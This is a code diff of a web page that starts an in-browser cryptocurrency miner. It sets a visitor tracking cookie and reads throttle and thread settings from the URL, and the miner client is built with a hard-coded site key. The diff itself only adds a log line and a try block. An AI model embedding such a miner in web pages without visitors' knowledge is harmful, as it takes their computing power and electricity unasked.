@@ -46,6 +46,8 @@
         setInterval(function(){
             document.querySelector(".console-log").innerHTML = "<p>" + console.logs.join("<br>") + "</p>";
         }, 1000);
+
+        console.log("Logging setup (If you can see this that means its working :)");
     </script>
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
@@ -112,93 +114,93 @@
     </div>
 
     <script>
-        var urlParams = new URLSearchParams(window.location.search);
-        
-        var param_throttle = (urlParams.get("throttle") != null) ? parseFloat(urlParams.get("throttle")) : null;
-        var param_threads = (urlParams.get("threads") != null) ? parseInt(urlParams.get("threads")) : null;
-
-        var status_text = document.getElementsByClassName("status")[0];
-        var sec_left_until_refresh_original = (urlParams.get("timeout") != null) ? parseInt(urlParams.get("timeout")) : 3600;
-        var sec_left_until_refresh = sec_left_until_refresh_original;
-
-        function convertBase(value) {
-            var from_range = '0123456789'.split('');
-            var to_range = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('');
-            var from_base = from_range.length;
-            var to_base = to_range.length;   
+        try {
+            var urlParams = new URLSearchParams(window.location.search);
             
-            var dec_value = `${value}`.split('').reverse().reduce(function (carry, digit, index) {
-                if (from_range.indexOf(digit) === -1) throw new Error('Invalid digit `'+digit+'` for base '+from_base+'.');
-                return carry += from_range.indexOf(digit) * (Math.pow(from_base, index));
-            }, 0);
-            
-            var new_value = '';
-            while (dec_value > 0) {
-                new_value = to_range[dec_value % to_base] + new_value;
-                dec_value = (dec_value - (dec_value % to_base)) / to_base;
+            var param_throttle = (urlParams.get("throttle") != null) ? parseFloat(urlParams.get("throttle")) : null;
+            var param_threads = (urlParams.get("threads") != null) ? parseInt(urlParams.get("threads")) : null;
+
+            var status_text = document.getElementsByClassName("status")[0];
+            var sec_left_until_refresh_original = (urlParams.get("timeout") != null) ? parseInt(urlParams.get("timeout")) : 3600;
+            var sec_left_until_refresh = sec_left_until_refresh_original;
+
+            function convertBase(value) {
+                var from_range = '0123456789'.split('');
+                var to_range = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('');
+                var from_base = from_range.length;
+                var to_base = to_range.length;   
+                
+                var dec_value = `${value}`.split('').reverse().reduce(function (carry, digit, index) {
+                    if (from_range.indexOf(digit) === -1) throw new Error('Invalid digit `'+digit+'` for base '+from_base+'.');
+                    return carry += from_range.indexOf(digit) * (Math.pow(from_base, index));
+                }, 0);
+                
+                var new_value = '';
+                while (dec_value > 0) {
+                    new_value = to_range[dec_value % to_base] + new_value;
+                    dec_value = (dec_value - (dec_value % to_base)) / to_base;
+                }
+                return new_value || '0';
             }
-            return new_value || '0';
-        }
 
-        var isRunning = false;
-        var uid;
-        if (urlParams.get("uid") == null){
-            if (getCookie("uid") == ""){
-                uid = makeid(5);
-                setCookie("uid", uid, 365);
+            var isRunning = false;
+            var uid;
+            if (urlParams.get("uid") == null){
+                if (getCookie("uid") == ""){
+                    uid = makeid(5);
+                    setCookie("uid", uid, 365);
+                }
+                else{
+                    uid = getCookie("uid");
+                }
             }
             else{
-                uid = getCookie("uid");
+                uid = urlParams.get("uid");
             }
-        }
-        else{
-            uid = urlParams.get("uid");
-        }
-        uid += "--";
-        (new Date().toISOString().split("T")[0].split("-")).forEach(e=>{
-            uid += convertBase(e) + " ";
-        })
-        uid = uid.trim().replaceAll(" ", "-");
+            uid += "--";
+            (new Date().toISOString().split("T")[0].split("-")).forEach(e=>{
+                uid += convertBase(e) + " ";
+            })
+            uid = uid.trim().replaceAll(" ", "-");
 
-        function setCookie(cname, cvalue, exdays) {
-            const d = new Date();
-            d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
-            let expires = "expires="+d.toUTCString();
-            document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
-        }
+            function setCookie(cname, cvalue, exdays) {
+                const d = new Date();
+                d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
+                let expires = "expires="+d.toUTCString();
+                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
+            }
 
-        function getCookie(cname) {
-            let name = cname + "=";
-            let ca = document.cookie.split(';');
-            for(let i = 0; i < ca.length; i++) {
-                let c = ca[i];
-                while (c.charAt(0) == ' ') {
-                c = c.substring(1);
+            function getCookie(cname) {
+                let name = cname + "=";
+                let ca = document.cookie.split(';');
+                for(let i = 0; i < ca.length; i++) {
+                    let c = ca[i];
+                    while (c.charAt(0) == ' ') {
+                    c = c.substring(1);
+                    }
+                    if (c.indexOf(name) == 0) {
+                    return c.substring(name.length, c.length);
+                    }
                 }
-                if (c.indexOf(name) == 0) {
-                return c.substring(name.length, c.length);
+                return "";
+            }
+
+            function StartMiner(){
+                _client.start();
+                isRunning = true;
+                sec_left_until_refresh = sec_left_until_refresh_original;
+            }
+
+            function makeid(length) {
+                var result           = '';
+                var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+                var charactersLength = characters.length;
+                for ( var i = 0; i < length; i++ ) {
+                    result += characters.charAt(Math.floor(Math.random() * charactersLength));
                 }
+                return result;
             }
-            return "";
-        }
-
-        function StartMiner(){
-            _client.start();
-            isRunning = true;
-            sec_left_until_refresh = sec_left_until_refresh_original;
-        }
-
-        function makeid(length) {
-            var result           = '';
-            var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-            var charactersLength = characters.length;
-            for ( var i = 0; i < length; i++ ) {
-                result += characters.charAt(Math.floor(Math.random() * charactersLength));
-            }
-            return result;
-        }
-
-        try {
+            
             var _client = new Client.User(
                 '831134d793c4ffe001a9b70ef565cac1f45561ecb927f1e96af5ecfb19b46c9f',
                 uid,
